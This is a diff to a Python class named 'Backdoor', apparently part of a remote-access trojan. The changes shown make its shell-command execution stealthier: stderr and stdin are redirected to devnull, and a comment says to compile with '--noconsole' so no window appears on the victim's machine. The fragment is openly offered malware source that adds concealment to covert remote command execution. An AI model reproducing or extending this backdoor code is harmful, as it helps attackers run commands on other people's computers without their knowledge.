@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
+#compile with --noconsole arg, see line 22
 
 import base64, json, os, socket, subprocess, sys
 
@@ -18,7 +19,11 @@ class Backdoor:
         
     def execute_system_command(self, command):
         try:
-            return subprocess.check_output(command, shell=True)
+            DEVNULL = open(os.devnull, 'wb') #DEVNULL var equals a stream - points to devnull location, OS-agnostic
+            #return subprocess.check_output(command, shell=True)
+            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+            #redirect stderr and std input to devnull
+            #return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) - python3
         except subprocess.CalledProcessError: #catch errors from incorrectly entered commands
             return "[-] Command error, check syntax and try again"
     
